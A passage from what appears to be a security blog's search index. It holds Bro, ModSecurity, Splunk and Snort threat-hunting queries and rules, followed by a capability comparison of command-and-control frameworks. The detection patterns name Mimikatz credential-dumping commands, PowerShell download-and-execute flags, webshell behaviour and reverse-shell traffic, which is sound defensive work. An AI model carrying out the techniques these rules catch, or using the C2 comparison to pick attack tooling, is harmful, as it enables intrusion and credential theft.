BRO_HTTP.mime_type=\"x-dosexec\" groupby:site</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#elsa-bro-uri-with-exe-downloads","title":"ELSA BRO URI with EXE downloads","text":"<p><code>class=BRO_HTTP BRO_HTTP.mime_type=\"x-dosexec\" groupby:BRO_HTTP.uri</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#elsa-bro-internal-ip-exe-download","title":"ELSA BRO Internal IP EXE download","text":"<p><code>class=BRO_FILES \"-\" mime_type=\"application/x-dosexec\" groupby:rx_hosts</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#elsa-bro-connections-wo-ua-group-by-source-ip","title":"ELSA BRO connections w/o UA group by source IP","text":"<p><code>class=BRO_HTTP \"-\" user_agent=\"-\" groupby:srcipt</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#bro","title":"BRO","text":""},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#bro-logs","title":"BRO Logs","text":"<p>Just a few logs that can be used to gather information. Note, custom logs can be created and referenced using the BRO.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#bro-log-hunting","title":"BRO Log Hunting","text":"BRO log Description conn.log IP/protocol connections conn-summary.log Statistics/summarizes activity known_hosts.log New hosts within past hour known_serices.log New services within past hour dpd.log Dynamic protocol detection weird.log Anomalous activity loaded_scripts.log Scripts loaded on start reporter.log Severity of issues with bro software.log Determines version of detected protocol various protocols (http,dns,ssl,etc) Activity log per protocol"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#bro-protocol-logs","title":"BRO Protocol Logs","text":"BRO log Description conn.log TCP/UDP/ICMP connections dce_rpc.log Distributed Computing Environment/RPC dhcp.log DHCP leases dnp3.log DNP3 requests and replies dns.log DNS activity ftp.log FTP activity http.log HTTP requests and replies irc.log IRC commands and responses kerberos.log Kerberos modbus.log Modbus commands and responses modbus_register_change.log Tracks changes to Modbus holding registers mysql.log MySQL ntlm.log NT LAN Manager (NTLM) radius.log RADIUS authentication attempts rdp.log RDP RDP rfb.log Remote Framebuffer (RFB) sip.log SIP smb_cmd.log SMB commands smb_files.log SMB files smb_mapping.log SMB trees smtp.log SMTP transactions snmp.log SNMP messages socks.log SOCKS proxy requests ssh.log SSH connections ssl.log SSL/TLS handshake info syslog.log Syslog messages tunnel.log Tunneling protocol events <p>BRO Log Reference \u2013 https://www.bro.org/sphinx-git/script-reference/log-files.html</p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#bro-carving","title":"BRO Carving","text":""},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#read-and-output-bro-logs","title":"Read and output bro logs","text":"<p><code>bro -r file.pcap</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-source-src-ip-dst-ip-dst-port-and-bytes-in-that-order","title":"Get source src ip, dst ip, dst port, and bytes (in that order)","text":"<p><code>cat conn.log |bro-cut id.orig_h id.resp_h id.resp_p orig_bytes |head -2</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#same-as-above-but-sort-by-bytes-field-5-reverse-by-number","title":"Same as above but sort by bytes (field 5 reverse by number)","text":"<p><code>cat conn.log |bro-cut id.orig_h id.orig_p id.resp_h id.resp_p orig_bytes|sort -k 5 -rn</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-http-on-non-standard-ports-ssl","title":"Get http on non-standard ports (ssl?)","text":"<p><code>cat conn.log | bro-cut service id.resp_p id.resp_h | awk '$1 == \"http\" &amp;&amp; ! ($2 == 80 || $2 == 8080) { print $3 }' | sort -u</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#extract-dns-info-from-bro-logs","title":"Extract DNS info from bro logs","text":"<p><code>cat dns.log |bro-cut query | sort -u</code></p> <p>and</p> <p><code>cat dns.log | bro-cut -d answers | sort -u</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-user-agents","title":"Get User-Agents","text":"<p><code>cat http.log | bro-cut user_agent | sort | uniq -c |sort -n</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-mime-types","title":"Get Mime Types","text":"<p><code>cat http.log | bro-cut orig_mime_type | sort | uniq -c |sort -n</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-bro-outbound-signature-stored-in-sig-file-read-with-s","title":"Get bro outbound signature stored in .sig file (read with -s)","text":"<pre><code>signature outbound-sig {\nip-proto == tcp\nsrc-ip == 192.168.0.0/16\ndst-ip != 192.168.0.0/16\ndst-port == 80\nhttp-request-header /^User-Agent:.*/\nevent \"Outbound HTTP traffic\"\n}\n</code></pre>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-bro-windows-shell-signature-stored-in-sig-file-read-with-s","title":"Get bro Windows Shell signature stored in .sig file (read with -s)","text":"<pre><code>signature windows_reverse_shell {\nip-proto == tcp\ntcp-state established,originator\nevent \"ATTACK-RESPONSES Microsoft cmd.exe banner (reverse-shell originator)\"\npayload /.*Microsoft Windows.*x28Cx29 Copyright 1985-.*Microsoft Corp/\n}\n</code></pre> <pre><code>signature windows_shell {\nip-proto == tcp\ntcp-state established,responder\nevent \"ATTACK-RESPONSES Microsoft cmd.exe banner (normal-shell responder)\"\npayload /.*Microsoft Windows.*x28Cx29 Copyright 1985-.*Microsoft Corp/\n}\n</code></pre>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#run-bro-with-sig-file","title":"Run bro with sig file","text":"<pre><code>bro -r file.pcap -s outbound.sig\n</code></pre>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#view-dst-addresses-in-signature-file","title":"View dst addresses in signature file","text":"<p><code>cat signatures.log |bro-cut dst_addr | sort | uniq -c |sort -n</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#bro-event-script-to-find-user-agent-outboundbro","title":"BRO event script to find User-Agent (outbound.bro)","text":"<pre><code>event http_header(c: connection, is_orig: bool, name: string, value: string)\n{\nlocal snet = 192.168.0.0/16;\nif (c$id$orig_h in snet)\n{\nif (c$id$resp_h !in snet)\n{\nif (c$id$resp_p == 80/tcp &amp;&amp; name == \"USER-AGENT\")\n{\nprint fmt (\"source IP %s, destination IP/port %s %s, USER-AGENT content %s\",\nc$id$orig_h,c$id$resp_h,c$id$resp_p,value);\n}\n}\n}\n}\n</code></pre> <p>BRO Scripting Reference \u2013 https://www.bro.org/sphinx/scripting/</p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#run-event-file-to-view-user-agent","title":"Run event file to view user-agent","text":"<p><code>bro -r file.pcap outbound-event.bro</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#bro-extract-common-files-from-pcap","title":"BRO extract common files from pcap","text":"<p><code>sudo bro -r file.pcap /opt/bro/share/bro/file-extraction/extract.bro</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#extract-ssl-info","title":"Extract ssl info","text":"<p><code>cat ssl.log | bro-cut server_name, subject, issuer_subject</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#bro-extract-unique-ssl-certificate-data","title":"BRO extract unique SSL certificate data","text":"<p><code>bro -C -r file.pcap &gt; cert_data.txt</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#bro-extract-ssl-issuer-data-from-certificate-extraction","title":"BRO extract SSL issuer data from certificate extraction","text":"<p><code>cat ssl.log|bro-cut issuer_subject|sort -u &gt; /tmp/bro/data.txt</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#bro-show-shortest-issuer-from-extraction","title":"BRO show shortest issuer from extraction","text":"<p><code>cat /tmp/bro/data.txt |awk '{print length, $0}'|sort -nr</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#modsecurity-rules","title":"ModSecurity rules","text":""},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#errorlog-ua-not-starting-with-mozilla","title":"error.log UA not starting with Mozilla","text":"<p><code>SecRule REQUEST_HEADERS:User-Agent \"!^Mozilla/d.d\" \"log,msg:'User-Agent without Mozilla/#.#'\"</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#errorlog-visiting-ip-url","title":"error.log visiting IP URL","text":"<p><code>SecRule REQUEST_HEADERS:Host \"^[d.:]+$\" \"log,msg:'Host used an IP address'\"</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#errorlog-blank-ua","title":"error.log blank UA","text":"<p><code>SecRule REQUEST_HEADERS:User-Agent \"^$\" \"log,msg:'Request has blank UA'\"</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#errorlog-ua-starting-with-mozilla","title":"error.log UA starting with mozilla","text":"<p><code>SecRule REQUEST_HEADERS:User-Agent \"^mozilla\" \"log,msg:'Request has mozilla UA'\"</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#errorlog-visiting-by-ip-log-ua-used","title":"error.log visiting by IP log UA used","text":"<p><code>SecRule REQUEST_HEADERS:Host \"^[d.:]+$\" \"log,msg:'Host used an IP address check errorlog for UA',logdata:'User-Agent:%{REQUEST_HEADERS.User-Agent}'\"</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#errorlog-no-ua-not-blank-but-none","title":"error.log no UA (not blank but none)","text":"<p><code>SecRule &amp;REQUEST_HEADERS:User-Agent \"@eq 0\" \"log,msg:'Request missing UA',logdata:'User-Agent:%{REQUEST_HEADERS.User-Agent}'\"</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#errorlog-note-param-entry","title":"error.log note param entry","text":"<p><code>SecRule &amp;ARGS:password \"@gt 1\" \"log,msg:'PW data',logdata:'params:%{REQUEST_LINE}'\"</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#errorlog-trigger-on-keyword-can-use-pattern","title":"error.log trigger on keyword (can use pattern)","text":"<p><code>#Trigger on EXFIL from body (phase:4 is the Response Body) SecRule RESPONSE_BODY \"badguy\" \"phase:4, msg:'HoneyToken Exfil Detected', tag:'HONEYTOKEN EXFIL'\"</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#splunk","title":"Splunk","text":"<p>Note these are examples and are mainly illustrated as templates for creating your own internal searches</p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#new-unauthorized-service","title":"New unauthorized service","text":"<p><code>index=windows LogName=System EventCode=7045 NOT (Service_Name=&lt;yourscanner&gt;) | eval Message=split(Message,\".\") | eval Short_Message=mvindex(Message,0) | table_time, host, Service_Name, Service_Type, Service_Start_Type, Service_Account, Short_Message</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#detecting-process-abuse","title":"Detecting process abuse","text":"<p><code>index=sysmon SourceType=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" ProcessCreate (whoami OR netstat OR etc) | search EventCode=1 Image=\"*\\whoami.exe\" OR Image=\"* etstat.exe\" OR Image=\"* asklist.exe\" | bin )time span=5m | rex field=Message \".*User:(xxx|NT AUTHORITY)\\(?&lt;USER&gt;.*)\" | stats dc(Image) AS CNT_CMDS values(CommandLine) values(ParentImage) values(ParentCommandLine) count by _time ComputerName USER</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#detecting-process-abuse-simplified-requires-one-entry-per-process","title":"Detecting process abuse (simplified, requires one entry per process)","text":"<p><code>index=sysmon Image=\"* et.exe\" (CommandLine=\"*net group*\" OR CommandLine=\"*net localgroup*\" OR CommandLine=\"*net user*\") | stats count by Computer,CommandLine</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#process-starts-and-connects-to-ip","title":"Process starts and connects to IP","text":"<p><code>index=windows LogName=System EventCode=5156 NOT (Source_Address=\"10.10.10.15\") NOT (Application_Name=\"path:file.exe\") | eval Message=split(Message,\".\") | table_time, host, Application_Name, Source_Address, Destination_Address, Direction</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#detect-smb-traffic-between-clients","title":"Detect SMB traffic between clients","text":"<p><code>index=sysmon SourceName=\"Microsoft-Windows-Sysmon\" EventCode=3 Initiated=true SourceIp!=DestinationIp DestinationPort=445 Image!=System (SourceHostname=\"fileserver1\" DestinationHostname=\"client1\") OR (Source_Address=\"10.10.1.5\" Destination_Address=\"10.10.10.15\") | stats by ComputerName ProcessGuid | fields ComputerName ProcessGuid</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#detect-named-pipes","title":"Detect Named Pipes","text":"<p><code>index=sysmon sourcetype=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" (PipeEvent \"Pipe Created\") | search (EventCode=17 (PipeName=\"\\*\")) | stats values (Image) AS Images values(PipeName) AS PipeNames count by TaskCategory ComputerName</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#detect-wmi","title":"Detect WMI","text":"<p><code>index=sysmon Image=\"*\\WMIC.exe\" (CommandLine=\"*process call create*\" OR CommandLine=\"*/NODE:*\") | stats count by Computer,CommandLine</code></p> <p>and</p> <p><code>index=sysmon ParentImage=\"*\\WmiPrvSE.exe\" | stats count by Computer,CommandLine</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#detect-powershell-commands","title":"Detect PowerShell Commands","text":"<p><code>index=sysmon ParentImage=\"*wsmprovhost.exe\" | stats count by Computer,CommandLine</code></p> <p>and</p> <p><code>index=sysmon Image=\"*powershell.exe\" (CommandLine=\"*-EncodedCommand*\" OR CommandLine=\"*-Enc*\" OR CommandLine=\"*-e*\" OR CommandLine=\"*new-object*\" OR CommandLine=\"*-nop*\" OR CommandLine=\"*-noprofile\" OR CommandLine=\"*-Command*\" OR COmmandLine=\"*-c*\" OR CommandLine=\"*Invoke-Command*\" OR CommandLine=\"*download*\" OR CommandLine=\"*IEX*\" OR CommandLine=\"*exec*\")| stats count by Computer,CommandLine</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#alert-on-remote-files-copied-via-cmd-line","title":"Alert on remote files copied via cmd line","text":"<p><code>index=windows LogName=Security EventCode=5145 Object_Type=File Share_Name=*$ (Access_Mask=0x100180 OR Access_Mask=0x80 OR Access_Mask=0x130197) |bucket span=1s _time |rex \"(?(0x100180|0x80|0x130197))\" |stats values(Relative_Target_Name) AS Relative_Target_Name, values(Account_Name) AS Account_Name, values(Source_Address) AS Source_Address, dc(thingtype) AS distinct_things by ComputerName, _time |search distinct_things=3</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#alert-on-c-or-admin-share-enumeration","title":"Alert on C or Admin share enumeration","text":"<p><code>index=windows LogName=Security EventCode=5145 Share_Name=*c$ OR *ADMIN$ (Access_Mask=0x100180) NOT (Source_Address=\"10.10.10.15\")|bucket span=1s _time |rex \"(?(0x100180))\" |stats values(Relative_Target_Name) AS Relative_Target_Name, values(Account_Name) AS Account_Name, values(Source_Address) AS Source_Address, dc(thingtype) AS distinct_things by ComputerName, _time |search distinct_things=3</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#search-for-file-delivery","title":"Search for file delivery","text":"<p><code>index=sysmon SourceName=\"Microsoft-Windows-Sysmon\" FileCreateStreamHash badfile.exe | search EventCode=15 | rex field=TargetFilename \".*\\(?&lt;TargFilename&gt;[^\\]*)\" | rex field=Image \".*\\(?&lt;ImageFilename[^\\]*)\" | rex field=Hash \".*MD5=(?&lt;MD5&gt;[A-F0-9]*),IMPHASH=(?&lt;IMPHASH&gt;[A-F0-9]*)\" | stats values(TargFilename) values(ComputerName) AS Clients count by TaskCategory ImageFilename MD5</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#search-for-registry-run-or-runonce-keys","title":"Search for Registry Run (or RunOnce) Keys","text":"<p><code>index=sysmon SourceName=\"Microsoft-Windows-Sysmon\" RegistryEvent CurrentVersion Run | search EventCode=13 \"*\\Windows\\CurrentVersion\\Run*\" | rex field=Image \".*\\(?Image_EXE&gt;[^\\]*)\" | rex field=TargetObject \".*\\CurrentVersion\\(?&lt;TargetObj_PATH&gt;.*)\" | strcat \"Image=\"\" IMage_EXE \"\", TargetObject=\"\" TargetObj_PATH \"\", Details=\"\" Details \"\"\" Image_TargetObj_Details | stats dc(ComputerName) AS Clients values(Image_TragetObj_Details) count by TaskCategory Image_EXE</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#search-for-file-system-persistence","title":"Search for file system persistence","text":"<p><code>index=sysmon SourceName=\"Microsoft-Windows-Sysmon\" ProcessCreate \"Start Menu\" Programs Startup | search Image=\"*\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\*\" | rex field=Image \".*\\Programs\\Startup\\(?&lt;Startup_Image&gt;[^\\]*)\" | rex field=Hash \".*MD5=(?&lt;MD5&gt;[A-F0-9]*),IMPHASH=(?&lt;IMPHASH&gt;[A-F0-9]*)\" | stats values(ComputerName) AS Clients vlaues(MD5) count by IMPHASH Startup_Image</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#detect-credential-harvesting","title":"Detect credential harvesting","text":"<p><code>index=sysmon ParentImage=\"*\\services.exe\" | regex CommandLine=\"\\[a-z0-9]{8}-[a-z0-9]{4}-[az0-9]{4}-[a-z0-9]{4}-[a-z0-9]{12}.exe-S$\"</code></p> <p>and</p> <p><code>index=sysmon CommandLine=\"*privileges::debug*\" OR CommandLine=\"*sekurlsa::*\" OR CommandLine=\"*kerberos::*\" OR CommandLine=\"*crypto::*\" OR CommandLine=\"*lsadump::*\" OR CommandLine=\"*process::*\"</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#potential-privilege-escalation","title":"Potential Privilege Escalation","text":"<p><code>index=sysmon sourcetype=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=4688 Token_Elevation_Type=\"*(2)\"</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#potential-beaconing-detection","title":"Potential Beaconing Detection","text":"<p><code>index=proxy sourcetype=bluecoat:proxysg:access:syslog url=* | eval current_time=_time | sort 0 + current_time | streamstats global=f window=2 current=f last(current_time) AS previous_time by src, url | eval diff_time=current_time-previous_time| eventstats count, stdev(diff_time) AS std by src, url</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#detect-webshell-activity-note-this-should-be-updated-at-implementation-and-often","title":"Detect webshell activity (note this should be updated at implementation and often)","text":"<p><code>index=sysmon ParentImage=\"*\u0007pache*\" ParentImage=\"* omcat*\" ParentImage=\"* ginx*\" ParentImage=\"*\\httpd*\" ParentImage=\"*\\php-cgi*\" ParentImage=\"*\\w3wp*\" CommandLine=\"*whoami*\" CommandLine=\"*net*\" CommandLine=\"*ipconfig*\" CommandLine=\"*hostname*\" CommandLine=\"*systeminfo*\" CommandLine=\"*cmd*\" CommandLine=\"*sh*\" CommandLine=\"*bash*\" CommandLine=\"*powershell*\"</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#detect-potential-sqli","title":"Detect potential SQLi","text":"<p><code>index=weblogs sourcetype=MSWindows:2008R2:IIS | regex cs_uri_query=\"(?i)(?:--|;|/*|@|@@version|char|alter|begin|cast|create|cursor|declare|delete|drop|end|exec|fetch|insert|kill|open|select|sys|table|update)\" | stats count by host c_ip cs_uri_stem cs_uri_query | rex field=cs_uri_query \"(?i)(?&lt;suspect&gt;--|;|/*|@|@@version|char|alter|begin|cast|create|cursor|declare|delete|drop|end|exec|fetch|insert|kill|open|select|sys|table|update)\" max_match=0</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#view-http-post-with-response","title":"View HTTP POST with response","text":"<p><code>index=json_bro eventtype=bro_http method=POST AND status &lt;=403 AND uri=*.php OR uri=*.jsp OR uri=*.cfm OR uri=*.asp OR uri=*.aspx |stats values(id.orig_h) AS Source, values,(hostname) AS Destination by uri</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#find-weird-user-agents","title":"Find Weird User-Agents","text":"<p><code>index=json_bro eventtype-bro_http |stats count by user_agent | sort -count | reverse</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-high-severity-epo-events","title":"Get high severity EPO events","text":"<p><code>index=av sourcetype=mcafee:epo (severity=critical OR severity=high) | stats values(event_description) AS desc, values(signature) AS signature, values(file_name) AS file_path, count AS result BY dest | eval dd=\"index=av sourcetype=mcafee:epo (severity=critical OR severity=high) dest=\".dest</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#snort","title":"Snort","text":"<p>Note these are examples and are mainly illustrated as templates for creating your own internal searches</p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#detect-psexec","title":"Detect psexec","text":"<p><code>alert tcp any any -&gt; $HOME_NET [139,445] (msg:\"ET POLICY PsExec? service created\"; flow:to_server, established; content:\"5c 00 50 00 53 00 45 00 58 00 45 00 53 00 56 00 43 00 2e 00 45 00 58 00 45\"; reference: url, xinn.org/Snort-psexec.html; reference:url, doc.emerginthreats.net/2010781:classtype:suspicious-filename-detect:sid:201781; rev:2;)</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#detect-packets-with-with-port-4444-port-0","title":"Detect packets with with port 4444 (port 0?)","text":"<p><code>alert tcp $EXTERNAL_NET any &lt;&gt; $HOME_NET 4444 (msg:\"BAD-TRAFFIC tcp port 4444 traffic\"; flow:stateless; classtype:misc-activity; sid:524; rev:8;)\"</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#snort-appid-list","title":"Snort appid list","text":"<p><code>sudo u2openappid /var/log/snort/appstats-unified.log.1455060958 |egrep -v '\"http\"|\"https\"|\"dns\"|\"internet_explor\"'|cut -d\",\" -f2|sort|uniq -c|sort -nr</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#interesting-file-extensions-note-this-is-the-same-list-as-above-placed-here-for-use-in-monitoring-via-snort","title":"Interesting file extensions (Note this is the same list as above, placed here for use in monitoring via Snort)","text":"<p><code>.ade, .adp, .ani, .bas, .bat, .chm, .cmd, .com, .cpl, .crt, .exe, .hlp, .ht, .hta, .inf, .ins, .isp, .jar, .job, .js, .jse, .lnk, .mda, .mdb, .mde, .mdz, .msc, .msi, .msp, .mst, .ocx, .pcd, .ps1, .reg, .scr, .sct, .shs, .svg, .url, .vb, .vbe, .vbs, .wbk, .wsc, .ws, .wsf, .wsh, .exe, .pif, .pub, .ip</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#additional-useful-info","title":"Additional Useful Info","text":""},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-methods-from-accesslog","title":"Get methods from access.log","text":"<p><code>cat access.log | cut -d\" -f2 | cut -d' ' -f1 | sort -u</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#decode-encoded-url-line-290","title":"Decode %encoded url (line 290)","text":"<p><code>awk ' {if (length($0) &gt; max){max=length($0);maxline=$0}} END {print maxline }' access.log|cut -d\" \" -f7|sed s/%//g|sed s/+//g|sed s/?//g|xxd -r -p</code></p> <p>or</p> <p><code>cat access.log |grep POST|grep cgi-bin|cut -d'\"' -f2|sort -u|sed s/%//g|sed s/+//g|cut -d\"?\" -f2|awk -F\"HTTP/1.1\" '{print $1}'|xxd -r -p</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#gather-information-on-windows-host","title":"Gather Information on Windows host","text":""},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#list-task-services","title":"List task services","text":"<p><code>tasklist /svc /fi \"imagename eq file.exe\"</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#show-modules-for-task","title":"Show modules for task","text":"<p><code>tasklist /m /fi \"imagename eq file.exe\"</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#verbose-task-information","title":"Verbose task information","text":"<p><code>tasklist /v /fi \"imagename eq file.exe\"</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-information-about-processes","title":"Get information about processes","text":"<p><code>get-wmiobject -class Win32_Process -Filter 'Name=\"file.exe\"'</code></p> <p>and</p> <p><code>get-process | select * |Where-Object {$_.ID -eq PID}</code></p> <p>and</p> <p><code>gwmi Win32_Process|Select ProcessName,ProcessID,ParentProcessID,CommandLine,@{e={$_.GetOwner().User}}|ft -wrap;netstat ano</code></p>"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#look-for-code-injected-into-memory","title":"Look for code injected into memory","text":"<p><code>Get-InjectedThread.ps1</code></p> <p>Reference \u2013 https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2</p>"},{"location":"blogs/2019/c2-agent-comparison/","title":"C2 Agent Comparison (AUG2019)","text":"<p>James Tubberville | August 28, 2019 | Tweet This Post: </p> <p></p> <p>I was recently asked to perform an evaluation of multiple command and control (C2) agents. Rather than spending an exorbitant amount of time (that could be used building a custom C2) on an evaluation, I decided to perform a quick comparison of several popular C2 agents.</p> <p>Systems for testing included Ubuntu 16.04, Ubuntu 18.04, MacOS 10.14.6, and Windows 10 (Defender, CrowdStrike, Tanium, McAfee, and a custom defense agent) all fully patched and updated as of August 19,2019.</p> <p>This comparison is in no way a complete review, evaluation, or judgment on the validity of any agent. Rather it is a very quick assessment of my first take on each (think hours not months). I also acknowledge that if a function, feature, or build did not work after two consecutive attempts it was abandoned.</p> <p>All readers should note that building a C2 agent or framework isn't easy. Building one that can handle the types of actions a true Red Team may perform while avoiding defensive mechanisms or processes and ensuring effective functionality is tough! Kudos to each of the authors!</p>"},{"location":"blogs/2019/c2-agent-comparison/#c2-comparison-matrices","title":"C2 Comparison Matrices","text":"Name License Purpose Platforms Supported Project Language Docker Collaborative Link Apfell BSD3 Post-Exp Cross python Yes Yes https://github.com/its-a-feature/Apfell Cobalt Strike Commercial Multi Win Sleep Yes Yes https://www.cobaltstrike.com/ Covenant GNU GPL3 Post-Exp Cross C# (.NET) Yes Yes https://github.com/cobbr/Covenant Empire BSD3 Post-Exp Cross Python Yes No https://github.com/EmpireProject/Empire Faction BSD3 Post-Exp Multi Python Yes Yes https://github.com/FactionC2/Faction iBombshell GNU GPL3 Post-Exp Win Powershell Yes No https://github.com/ElevenPaths/ibombshell Koadic Apache 2 Post-Exp Win VBScript/JScript No https://github.com/zerosum0x0/koadic Merlin GNU GPL3 Post-Exp Cross Go No No https://github.com/Ne0nd0g/merlin Pinjectra BSD3 ProcInj Win C+ NA NA https://github.com/SafeBreach-Labs/pinjectra PoshC2 BSD3 Post-Exp Cross Powershell/Python No Limited https://github.com/nettitude/PoshC2_Python Sliver GNU GPL3 Post-Exp Cross Go Yes No https://github.com/BishopFox/sliver Silentrinity GNU GPL3 Post-Exp Multi Python No Yes https://github.com/byt3bl33d3r/SILENTTRINITY Trevor C2 WTH Post-Exp Multi Python/Powershell Yes No https://github.com/trustedsec/trevorc2 <p>Note: I\u2019ve identified differences between multi and cross platform. Cross supports some combination of Windows, Linux, and/or Mac natively. Multi indicates the ability to (easily) write agents to support other platforms. (In this context Cross is better :))</p> Name Cmd Exec Script Exec Pivot Cmds Traffic Fwd File Upload File Download Credential Gathering Token Manipulation Session Pivoting Malleable C2 Memory or Disk Resident MITRE ATT&amp;CK Apfell x x - - x x L - - x D x Cobalt Strike x x x L x x x x x x M or D x Covenant x x x L x x x x - x M or D - Empire x x - - x x x x - x M or D x Faction x x x L x x - - - x D (M?) x iBombshell x x x L x x x x - With effort M - Koadic x x B L x x x L - - M or D - Merlin x x x L x x x L x x D Pinjectra PoshC2 x x - L x x x x - x D x Sliver x x - - x x - L - L D Silenttrinity L L L L x L x - exit L D Trevor C2 x x - - - - - - x L D <p>Description:</p> <ul> <li>Cmd Exec - Execution of host cmds with switches via console</li> <li>Script Exec - Execution of various scripts from console</li> <li>Pivot Cmds - Ability to natively relay cmds to lateral systems via console</li> <li>Traffic Fwd - Ability to natively relay traffic to lateral systems via console</li> <li>File Upload/Download - Ability to place and pull files via console</li> <li>Cred Gathering - Ability to pull credentials (plaintext|hash|tokens) from host via console</li> <li>Token Manipulation - Ability to create and/or send tokens to host or lateral system via console</li> <li>Session Pivoting - 